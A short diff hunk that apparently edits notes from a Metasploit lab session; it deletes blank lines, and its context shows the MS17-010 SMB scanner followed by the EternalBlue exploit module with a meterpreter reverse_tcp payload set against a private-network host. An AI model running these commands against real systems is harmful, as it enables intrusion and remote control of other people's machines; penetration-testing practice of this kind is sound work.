@@ -64,9 +64,6 @@ msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
 
 
 
-
-
-
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.59.197
